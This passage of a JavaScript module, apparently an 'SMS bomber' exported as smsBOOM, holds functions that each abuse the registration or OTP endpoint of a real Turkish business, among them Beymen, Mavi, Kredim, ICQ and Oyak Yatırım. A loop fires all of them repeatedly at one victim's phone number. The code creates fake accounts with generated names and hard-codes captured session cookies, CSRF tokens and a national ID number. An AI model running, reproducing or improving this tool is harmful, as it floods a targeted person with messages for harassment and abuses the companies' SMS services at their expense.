            'sec-ch-ua-platform': 'Windows',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'accept-encoding': 'gzip',
        };
    
        const data = {
            source: 'Register',
            type: 8,
            Number: '+90' + no,
            message: '',
            templateCode: 'VerifyMember',
            originator: 'OTP|KREDIM',
        };
    
        try {
            const response = await axios.post('https://api.kredim.com.tr/api/v1/Communication/SendOTP', data, {
                headers,
            });
            console.log('[+] Kredim - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] Kredim - ' + no + ' - Hatalı'.red);
        }
    }

    // toyzzshop

    async function toyzzshop(no) {
        const headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://www.toyzzshop.com/uye',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'X-CSRF-TOKEN': 'dM0ctBFq6mkW0IXStEB6EOjsrHaSMj9C3Hc4JT3o',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'Accept-Encoding': 'gzip',
        };
    
        const cookies = 'laravel_session=CDJfb3JyIZAk7IWHHuaFxtjY20g4ObckGXDijYJd; last_outputed_email=eyJpdiI6InBmYWxcL0pkOEhQZHArQ0lyUzlmcHZ3PT0iLCJ2YWx1ZSI6IjRWQnQ4aWc0RDd5TDQ2ZE9PU1k3dVFVSWtZUTY0d1B2RjVDQXp5QlV4V0U9IiwibWFjIjoiYmUxNWE1ZWQ4NjRiOGJjNjI3MzMxMjI3ODY5OTI0MzYyNjBhYzE2ZGM5YjEyNTU4YTAxMzQxNTIwMTY3NzM4ZSJ9; remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IkFickJLY0hKOHBWK3A2QThmRGk0MVE9PSIsInZhbHVlIjoiZG82Y21kZUdRYXpwT0JjZHVOaW9qZDdqQ0hDU3A3U2RPUExjVk5pNERMMjEzWHNsUzJIY1FWdll2Vys5UE1nRjZhRVJoU1JvVUR5VlE1TktIdjdDNUtjU3J6TFF2QXBidnhqMThTUDh5RGc9IiwibWFjIjoiYmQ1ZWJjMzkzMDExODQzYzFjODBjOTQzNjc1ZDlmMTk1ZTAzZTU3NWJhZTVmNjc3MTE3MTdjZTcyNTYzZGY2MSJ9';
    
        try {
            const response = await axios.get(`https://www.toyzzshop.com/uye/mobile-number-change-sms-send?mobile_number=0${no}`, {
                headers,
                cookies,
            });
            console.log('[+] Toyzzshop - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] Toyzzshop - ' + no + ' - Hatalı'.red);
        }
    }

    //  wcollection

    async function wcollection(no) {
        const randomEmail = generateRandomEmail();
        const headers = {
            'authority': 'www.wcollection.com.tr',
            'accept': '*/*',
            'accept-language': 'tr-TR,tr;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.wcollection.com.tr',
            'referer': 'https://www.wcollection.com.tr/users/register/',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
            'accept-encoding': 'gzip',
        };
    
        const cookies = 'csrftoken=PWSgyjoMyfArZMtUhufmUTzPDsYeAqcPxmS9TiiECvn1dKoSHfU8VTZzAjY8ABoI; sessionid=iu56ea8i5dm4gfdaglojia48eykr7ps1';
    
        try {
            const response = await axios.post('https://www.wcollection.com.tr/users/register/', {
                first_name: faker.name.firstName(),
                last_name: faker.name.lastName(),
                phone: '0' + no,
                date_of_birth: '1996-02-15',
                email: randomEmail,
                password: faker.internet.password(),
                gender: 'male',
                email_allowed: true,
                sms_allowed: true,
                call_allowed: true,
                confirm: true,
                checkox_contract: true,
            }, {
                headers,
                withCredentials: true,
                credentials: 'include',
                jar: true,
                transformRequest: [(data, headers) => {
                    delete headers.common['X-CSRF-TOKEN'];
                    return data;
                }],
            });
            console.log('[+] wcollection - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] wcollection - ' + no + ' - Hatalı'.red);
        }
    }

    // beymen

    async function beymen(no) {
        const randomEmail = generateRandomEmail();
        
        const headers = {
            'authority': 'www.beymen.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'tr-TR,tr;q=0.8',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.beymen.com',
            'referer': 'https://www.beymen.com/customer/register?returnUrl=/customer',
            'requestverificationtoken': 'iDFjPhIn8JK5RRGVzWexmbwqkBGzCvvwRhKeUgn7MtEWSgXO61zQvYmnjE615vpm8JeMx4K7cFTONCEkbfNh1SK2awl5llesjWURwly0mLU1',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'accept-encoding': 'gzip',
            'cookie': 'visid_incap_2753670=cqvpNAYvTBikaQj0+ZrXdBKMYmUAAAAAQUIPAAAAAABR7k4Z3SzjTCY0YxRjQqQ/; incap_ses_1193_2753670=A/RNGsRowFWuQF/vSWSOEBKMYmUAAAAAIcSOOFKu4rlP2R4h8w7IYA==; FirstVisitDate=v4t9f5cRZXdcPqHVRgQo4rP5S4JuJptPMLnU6SbgFTM=; UserSessionId=61484b07-cbef-4aa1-b57d-4be15de090bb; nlbi_2753670=3k2pXCO/7nmm9myUJ4guPwAAAADG+diDoZohurP+y4jXDt0b; Entegral.CookieKey.CouponTicket=hYS6rxUtUbEhLz36AoKl23bvTZ7BYbaj/DiO3snjwSM=; nlbi_2753670_2622607=o6/ReLxbfyyrWxUlJ4guPwAAAAA/7DiHVitauMEiMNrnu9B6; __RequestVerificationToken=b3JYpdBWqC6nj7lgauWJ_b1KQGURCdl9dFBZt9aAhmX5FwAPrPJhe6sw4LNULO2agX_TcbnioonDTIllu-KLnuf__wc4CEWCrEw0GZfPoBQ1; Entegral.CookieKey.RelationWithMdm=NoMatch',
        };
    
        try {
            const response = await axios.post('https://www.beymen.com/customer/SendOtpMessageForNewCustomerPhoneVerification', {
                CustomerName: faker.name.firstName(),
                EmailAddress: randomEmail,
                PhoneNumber: no,
            }, {
                headers,
            });
    
            console.log('[+] beymen - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] beymen - ' + no + ' - Hatalı'.red);
        }
    }

    // oyakyatirim

    async function oyakyatirim(no) {
        const randomEmail = generateRandomEmail();
    
        const headers = {
            'Accept': 'application/json',
            'Accept-Language': 'tr-TR,tr;q=0.7',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://hesap.oyakyatirim.com.tr',
            'Referer': 'https://hesap.oyakyatirim.com.tr/register',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'Accept-Encoding': 'gzip',
            'Cookie': 'ADRUM=s=1700938257579&r=https%3A%2F%2Fsube.oyakyatirim.com.tr%2Ftr%2FAccount%2FOperation%2FRememberPassword%3F0; session=Fe26.2*1*b86f3258b1cd2f7a988615ce8e7d7804f8138331d30639b3960081215ef30937*UVdSMCA6UArjfCzqB-rI3A*lKtUczWQfwE0_VXieQMe2fqjvqjSzhGpiaXyATId6eTcSkIF4nbNARIi80cTtPyEatnSZSlfh2A_IyNZhbrBLIOgHzk8xPeyiJPt1F32Y4OdaqytL4q8yoU0a7w02hwnk_YqDjtTV1WBawgYSpWKxv2ntcvcv8ND1Ay68LVUU9eGsctf4OvSIX69F5TzpV5kl3bL4CCA3Xf4Xhi97Yy97g*1702253668212*cfc19f6f23e1d58c45f70548556fbb1087175197e49bb9005ff0d7fae1375b7d*5HO5faYRdEw-7dNBj4rjSZKKjkaZtE9OWlfdeqMgx-4~2; TS01d41841=015cb5a211e903f2e4d789a29ba406e1fcf7d39c8bdcda3ad2d2a6d2768b32f1f8018d61f40fc6926658bea4cce906fec3b13fa1b3794632aec0d57ef4584b2f42765072d9',
        };
    
        try {
            const response = await axios.post('https://hesap.oyakyatirim.com.tr/api/phone', {
                nationalId: '11623927056',
                cellPhone: no,
                KVKKApproval: true,
            }, {
                headers,
            });
    
            console.log('[+] oyakyatirim - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] oyakyatirim - ' + no + ' - Hatalı'.red);
        }
    }

    // uysalmarket

    async function uysalmarket(no) {
        const randomEmail = generateRandomEmail();
    
        const headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://uysalmarket.com.tr',
            'Referer': 'https://uysalmarket.com.tr/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'Accept-Encoding': 'gzip',
        };
    
        axios.post('https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms', {
            phone_number: no,
        }, {
            headers,
        })
        .then((response) => {
            console.log('[+] uysalmarket - ' + no + ' - Başarılı'.green);
        })
        .catch((error) => {
            console.error('[-] uysalmarket - ' + no + ' - Hatalı'.red);
        });
    }

    // espressolab

    async function espressolab(no) {
        const randomEmail = generateRandomEmail();
      
        try {
          const response = await axios.post('https://www.espressolab.com/shop/Register.aspx/RegisterUser', {
            GenderId: 'E',
            IsAccept: 'true',
            IsRead: 'true',
            birthdate: '09/06/1990',
            campaingpermission: '1',
            confirmpassword: 'asdasdasd',
            email: randomEmail,
            namesurname: faker.name.firstName(),
            password: 'asdasdasd',
            phonenumber: '90' + no,
          }, {
            headers: {
              'authority': 'www.espressolab.com',
              'accept': 'application/json, text/javascript, */*; q=0.01',
              'accept-language': 'tr-TR,tr;q=0.7',
              'content-type': 'application/json; charset=UTF-8',
              'origin': 'https://www.espressolab.com',
              'referer': 'https://www.espressolab.com/shop/uye-ol/',
              'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': 'Windows',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'sec-gpc': '1',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
              'x-requested-with': 'XMLHttpRequest',
              'accept-encoding': 'gzip',
            },
            withCredentials: true,
          });
      
          if (response.data && response.data.success) {
            console.log('[+] espressolab - ' + no + ' - Başarılı'.green);
          } else {
            console.error('[-] espressolab - ' + no + ' - Hatalı'.red);
          }
        } catch (error) {
          console.error('[-] espressolab - ' + no + ' - Hatalı'.red);
        }
      }

    // icq

    async function icq(no) {
        const randomEmail = generateRandomEmail();
      
        try {
          const response = await axios.post('https://u.icq.net/api/v92/rapi/auth/sendCode', {
            reqId: '6548-1700995835',
            params: {
              phone: '90' + no,
              language: 'en-US',
              route: 'sms',
              devId: 'ic1rtwz1s1Hj1O0r',
              application: 'icq',
            },
          }, {
            headers: {
              'authority': 'u.icq.net',
              'accept': '*/*',
              'accept-language': 'tr-TR,tr;q=0.9',
              'content-type': 'application/json',
              'origin': 'https://web.icq.com',
              'referer': 'https://web.icq.com/',
              'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': 'Windows',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'cross-site',
              'sec-gpc': '1',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
              'accept-encoding': 'gzip',
            },
          });
      
          if (response.data) {
            console.log('[+] icq - ' + no + ' - Başarılı'.green);
          } else {
            console.error('[-] icq - ' + no + ' - Hatalı'.red);
          }
        } catch (error) {
            console.error('[-] icq - ' + no + ' - Hatalı'.red);
        }
      }

    // my

    async function my(no) {
        try {
          const response = await axios.post(
            'https://account.my.com/signup_send_sms/',
            `phone=90${no}&csrf_token=fsxDtgphXjBOFFYYzawfwD`,
            {
              headers: {
                'Accept': '*/*',
                'Accept-Language': 'tr-TR,tr;q=0.8',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://account.my.com',
                'Referer': 'https://account.my.com/tr/signup/?continue=https%3A%2F%2Faccount.my.com%2Ftr%2Fprofile%2Fuserinfo%2F',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-GPC': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'Accept-Encoding': 'gzip',
                'Cookie': 'csrf_token=fsxDtgphXjBOFFYYzawfwD; s=rt=1|dpr=1.25; mr1lad=656334074f3ad9fc-300-300-',
              },
            }
          );
      
          if (response.data) {
            console.log('[+] my - ' + no + ' - Başarılı'.green);
          } else {
            console.error('[-] my - ' + no + ' - Hatalı'.red);
          }
        } catch (error) {
            console.error('[-] my - ' + no + ' - Hatalı'.red);
        }
      }

    // money
      
    async function money(no) {
        try {
          const randomEmail = generateRandomEmail();
      
          const response = await axios.post(
            'https://www.money.com.tr/Register/ValidateAndSendOTP',
            `ProcessId=188CE118-A677-4AB1-8391-7AA21BE85B3A&CardNumber=&FirstName=muhammed&LastName=ensa&Phone=${no}&BirthDate=10.12.1991&Gender=E&Email=${randomEmail}&CityId=05&TermsOfUseAccepted=true&MoneyElectronicContactPermissionAccepted=true&__RequestVerificationToken=CfDJ8Nhpx3mYLppEuwVMXp9IBf34-_heX0fXtj96TRaRaEhW0BtsYATy17OUGJhSg3m8U8Jw9hzv9yJSp8zDnpT3FgNLhqT8YLEh9haqXHynv3uyLG29XftjSjqbW7j112bvxXTBgpWhAoR15-GeX_yPs10&TermsOfUseAccepted=false&MoneyElectronicContactPermissionAccepted=false`,
            {
              headers: {
                'Accept': '*/*',
                'Accept-Language': 'tr-TR,tr;q=0.5',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://www.money.com.tr',
                'Referer': 'https://www.money.com.tr/uye-ol',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-GPC': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'Accept-Encoding': 'gzip',
                'Cookie': 'ARRAffinity=39d91f16fdd59b39d7a07780844d80b88a73a7f54a8a5e7eeddb8cc0cb631057; ARRAffinitySameSite=39d91f16fdd59b39d7a07780844d80b88a73a7f54a8a5e7eeddb8cc0cb631057; cookiesession1=678A3E272BAF9DDA7033D17311540D21; _SI_VID_1.bf37aae48800011b514bea39=179c62636b22d93c470848f2; _SI_DID_1.bf37aae48800011b514bea39=558a2937-5c32-3e62-966d-10c8a69e897a; userToken=9dee4197-00ca-45d7-9fb2-8f3c0f3be269; MoneyclubKartWeb=CfDJ8Nhpx3mYLppEuwVMXp9IBf3d980VUAiD0RrgmXMYG1%2BAPkRsIG1RdOcxhGCdZMXeGn3JfChrDlsyxUcqUBK%2BWm6bgYQe4cTOfAuH1j2hVn7im%2Fq5Db8s3Juge0khxAnPN43ml5u6XoK9KyJN2iRMpFBr5uKp0e%2FCCRYgxZeWB3Tc; .AspNetCore.Antiforgery.9fXoN5jHCXs=CfDJ8Nhpx3mYLppEuwVMXp9IBf3OJvL3AlPODaoBUTCyxS3MahvcS6jBLHFHX9xPsLyUxSzijlnnRjkIU2pAOa3G6WGAiVcxtnskDrLYQ2iiEzB7Nb463tlw-gLLyAsaPrbLCeY5kJ9TvFE8Oz94VOy7NvI; _SI_SID_1.bf37aae48800011b514bea39=3ba4e9fca98df8533a888fe3.1701000799274.8304',
              },
            }
          );
      
          if (response.data) {
            console.log('[+] money - ' + no + ' - Başarılı'.green);
          } else {
            console.error('[-] money - ' + no + ' - Hatalı'.red);
          }
        } catch (error) {
            console.error('[-] money - ' + no + ' - Hatalı'.red);
        }
      }

    // mavi

    async function mavi(no) {
        try {
          const randomEmail = generateRandomEmail(); // generateRandomEmail fonksiyonunu uygun şekilde implemente edin
      
          const response = await axios.post(
            'https://www.mavi.com/register/newcustomer',
            `firstName=Ylmaz&lastName=Gl&phoneNumber=${no}&day=03&month=04&year=1996&gender=MALE&eMail=${randomEmail}&password=Skidlamer123!&confirmPassword=Skidlamer123!&smsPermission=true&emailPermission=true&acceptAgreement=false&CSRFToken=073458e9-b329-481c-82c6-57632800422b`,
            {
              headers: {
                'authority': 'www.mavi.com',
                'accept': '*/*',
                'accept-language': 'tr-TR,tr;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.mavi.com',
                'referer': 'https://www.mavi.com/register',
                'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                'accept-encoding': 'gzip',
              },
              cookie: 'JSESSIONID=E80B900E59A8AB7AB2D757B8159E0FAB.accstorefront-79b66b79-zkkn8; ROUTE=.accstorefront-79b66b79-zkkn8',
            }
          );
      
          if (response.data) {
            console.log('[+] mavi - ' + no + ' - Başarılı'.green);
          } else {
            console.error('[-] mavi - ' + no + ' - Hatalı'.red);
          }
        } catch (error) {
            console.error('[-] mavi - ' + no + ' - Hatalı'.red);
        }
      }

    // asfaltta durmaz subaru

    async function subaru(no) {
        try {
          const response = await axios.post(
            'https://subaru.com.tr/Form/VerifyToCRM',
            `Code=MA160105&Phone=0${no}&val1=Positive&val2=Positive&val3=Negative&val4=Negative`,
            {
              headers: {
                'authority': 'subaru.com.tr',
                'accept': '*/*',
                'accept-language': 'tr-TR,tr;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://subaru.com.tr',
                'referer': 'https://subaru.com.tr/subaru-electric-community',
                'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                'accept-encoding': 'gzip',
              },
              cookie: '.AspNetCore.Antiforgery.KG13AUBbHo8=CfDJ8LXkVrtzMsBOr7dwStENiaKt4JR7kYf7-N_BTXQS1z1qFR3jQj5pM6v6NCoYnVyCz9evP_5vnSDykjcDKjnvo3Ro8v06M4kaaAaJUgeOZrQrzGmWMEZSVk3eAFlQWXwRjlu0NpYtLg-XO9uyMvPZTrY',
            }
          );
      
          if (response.data) {
            console.log('[+] subaru - ' + no + ' - Başarılı'.green);
          } else {
            console.error('[-] subaru - ' + no + ' - Hatalı'.red);
          }
        } catch (error) {
            console.error('[-] subaru - ' + no + ' - Hatalı'.red);
        }
      }

    // erdeger

    async function erdeger(no) {
        try {
          const randomEmail = generateRandomEmail();
      
          const form = new FormData();
          form.append('adsoyad', faker.name.firstName());
          form.append('telefon', no);
          form.append('email', randomEmail);
          form.append('marka', 'İkinci El');
          form.append('departman', 'İkinci El Araç');
          form.append('sehir', 'Adıyaman');
          form.append('not', '');
          form.append('onay', '1');
          form.append('traffic', 'https://www.google.com/');
      
          const response = await axios.post('https://www.erdeger.com.tr/mail.php?type=bizSiziArayalim', form, {
            headers: {
              ...form.getHeaders(),
              'authority': 'www.erdeger.com.tr',
              'accept': '*/*',
              'accept-language': 'tr-TR,tr;q=0.9',
              'origin': 'https://www.erdeger.com.tr',
              'referer': 'https://www.erdeger.com.tr/biz-sizi-arayalim',
              'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': 'Windows',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'sec-gpc': '1',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
              'x-requested-with': 'XMLHttpRequest',
              'accept-encoding': 'gzip',
              'cookie': 'PHPSESSID=q81rqpacrcok3rk03md85q0c17',
            },
          });
      
          if (response.data) {
            console.log('[+] erdeger - ' + no + ' - Başarılı'.green);
          } else {
            console.error('[-] erdeger - ' + no + ' - Hatalı'.red);
          }
        } catch (error) {
            console.error('[-] erdeger - ' + no + ' - Hatalı'.red);
        }
      }
      


    function send(no) {
        kigili(no);
        kahvedunyasi(no);
        naosstars(no);
        wmf(no);
        bim(no);
        sok(no);
        migros(no);
        a101(no);
        englishhome(no);
        sakasu(no);
        tiklagelsin(no);
        mopas(no);
        salonrandevu(no);
        enzahome(no);
        samsonite(no);
        zubizu(no);
        dsmart(no);
        netspeed(no);
        houseofsuperstep(no);
        mudo(no);
        occasion(no);
        sportive(no);
        dominos(no);
        kredim(no);
        toyzzshop(no);
        wcollection(no);
        beymen(no);
        oyakyatirim(no);
        uysalmarket(no);
        espressolab(no);
        icq(no);
        my(no);
        money(no);
        mavi(no);
        subaru(no);
        erdeger(no);
    }

    for (let i = 0; i < miktar; i++) {
        await delay(5);
        send(numara);
    }
}

module.exports = smsBOOM;
